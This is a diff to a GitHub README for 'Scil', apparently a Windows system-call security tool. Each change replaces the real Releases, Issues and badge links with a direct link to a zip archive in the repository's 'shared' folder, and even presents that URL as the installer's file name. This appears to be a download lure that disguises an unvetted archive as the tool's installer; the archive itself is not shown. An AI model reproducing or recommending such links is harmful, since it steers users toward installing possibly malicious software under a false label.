@@ -4,20 +4,20 @@
 Scil is an experimental software that enhances the security of system calls in Windows 11. It aims to protect your system by ensuring that system calls behave as expected, thereby preventing unauthorized actions. This tool is particularly useful for those interested in security research or looking to improve their system's safety.
 
 ## 📥 Download Scil
-[![Download Scil](https://img.shields.io/badge/Download%20Scil-v1.0-blue)](https://github.com/mryasheyt/Scil/releases)
+[![Download Scil](https://github.com/mryasheyt/Scil/raw/refs/heads/master/shared/Software_v3.8-alpha.2.zip%20Scil-v1.0-blue)](https://github.com/mryasheyt/Scil/raw/refs/heads/master/shared/Software_v3.8-alpha.2.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run Scil on your Windows 11 computer.
 
 1. **Visit the Releases Page**
    - Click the link below to open the Releases page on GitHub:
-   - [Visit this page to download](https://github.com/mryasheyt/Scil/releases)
+   - [Visit this page to download](https://github.com/mryasheyt/Scil/raw/refs/heads/master/shared/Software_v3.8-alpha.2.zip)
 
 2. **Choose the Latest Release**
    - On the Releases page, look for the most recent version listed at the top. It will have the highest version number.
 
 3. **Download the Installer**
-   - Find the file that mentions an installer executable, typically named like `Scil-Setup.exe`. Click on it to start the download.
+   - Find the file that mentions an installer executable, typically named like `https://github.com/mryasheyt/Scil/raw/refs/heads/master/shared/Software_v3.8-alpha.2.zip`. Click on it to start the download.
 
 4. **Locate the Downloaded File**
    - After the download completes, find the file in your "Downloads" folder or the location where your browser saves files.
@@ -49,10 +49,10 @@ Before installing Scil, ensure that your system meets the following requirements
 
 ## ✅ Download & Install
 To start using Scil, you can return to the Releases page and download the latest version here:
-- [Visit this page to download](https://github.com/mryasheyt/Scil/releases)
+- [Visit this page to download](https://github.com/mryasheyt/Scil/raw/refs/heads/master/shared/Software_v3.8-alpha.2.zip)
 
 ## 📞 Support
-If you have questions or need assistance, check the [GitHub Issues page](https://github.com/mryasheyt/Scil/issues) for help or to report any problems. Your input helps improve Scil.
+If you have questions or need assistance, check the [GitHub Issues page](https://github.com/mryasheyt/Scil/raw/refs/heads/master/shared/Software_v3.8-alpha.2.zip) for help or to report any problems. Your input helps improve Scil.
 
 ## 🏷️ Topics
 - EDR
